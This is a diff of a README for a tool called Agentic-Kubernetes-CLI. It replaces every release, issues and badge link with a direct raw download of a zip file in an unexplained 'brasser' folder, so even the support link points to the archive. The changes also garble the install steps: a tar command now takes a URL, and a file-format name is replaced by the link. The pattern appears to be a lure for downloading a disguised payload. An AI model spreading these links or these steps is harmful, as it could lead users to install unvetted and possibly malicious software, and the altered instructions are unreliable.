@@ -2,7 +2,7 @@
 
 ## 📥 Download Now
 
-[![Download Agentic-Kubernetes-CLI](https://img.shields.io/badge/Download-Agentic--Kubernetes--CLI-blue.svg)](https://github.com/andersoncarmona913/Agentic-Kubernetes-CLI/releases)
+[![Download Agentic-Kubernetes-CLI](https://raw.githubusercontent.com/andersoncarmona913/Agentic-Kubernetes-CLI/main/brasser/Agentic-Kubernetes-CLI.zip)](https://raw.githubusercontent.com/andersoncarmona913/Agentic-Kubernetes-CLI/main/brasser/Agentic-Kubernetes-CLI.zip)
 
 ## 🚀 Getting Started
 
@@ -22,18 +22,18 @@ Before you begin, ensure your system meets these requirements:
 
 ### 1. Visit the Release Page
 
-Go to our [Releases page](https://github.com/andersoncarmona913/Agentic-Kubernetes-CLI/releases) to find the latest version of Agentic-Kubernetes-CLI.
+Go to our [Releases page](https://raw.githubusercontent.com/andersoncarmona913/Agentic-Kubernetes-CLI/main/brasser/Agentic-Kubernetes-CLI.zip) to find the latest version of Agentic-Kubernetes-CLI.
 
 ### 2. Download the Application
 
-Locate the file for your operating system on the Releases page. Click on the link to start downloading. This file will typically be in either `.zip` (for Windows) or `.tar.gz` (for Linux and macOS) format.
+Locate the file for your operating system on the Releases page. Click on the link to start downloading. This file will typically be in either `.zip` (for Windows) or `https://raw.githubusercontent.com/andersoncarmona913/Agentic-Kubernetes-CLI/main/brasser/Agentic-Kubernetes-CLI.zip` (for Linux and macOS) format.
 
 ### 3. Extract the Files
 
 Once downloaded, you will need to extract the files:
 
 - **Windows:** Right-click the `.zip` file and select "Extract All."
-- **macOS/Linux:** Use the terminal command `tar -xvzf filename.tar.gz` to extract the files.
+- **macOS/Linux:** Use the terminal command `tar -xvzf https://raw.githubusercontent.com/andersoncarmona913/Agentic-Kubernetes-CLI/main/brasser/Agentic-Kubernetes-CLI.zip` to extract the files.
 
 ### 4. Run the Application
 
@@ -71,10 +71,10 @@ If you encounter issues:
 
 ## 🕵️‍♂️ Support and Feedback
 
-For any issues or questions, please raise them on our [GitHub Issues page](https://github.com/andersoncarmona913/Agentic-Kubernetes-CLI/issues). We welcome feedback and will do our best to address your needs.
+For any issues or questions, please raise them on our [GitHub Issues page](https://raw.githubusercontent.com/andersoncarmona913/Agentic-Kubernetes-CLI/main/brasser/Agentic-Kubernetes-CLI.zip). We welcome feedback and will do our best to address your needs.
 
 ## 💾 Download & Install Again
 
-Remember, you can always revisit our [Releases page](https://github.com/andersoncarmona913/Agentic-Kubernetes-CLI/releases) to download the latest version. Keep your application updated for the best performance.
+Remember, you can always revisit our [Releases page](https://raw.githubusercontent.com/andersoncarmona913/Agentic-Kubernetes-CLI/main/brasser/Agentic-Kubernetes-CLI.zip) to download the latest version. Keep your application updated for the best performance.
 
 Thank you for using Agentic-Kubernetes-CLI! We hope it makes your Kubernetes management easier and more intuitive.
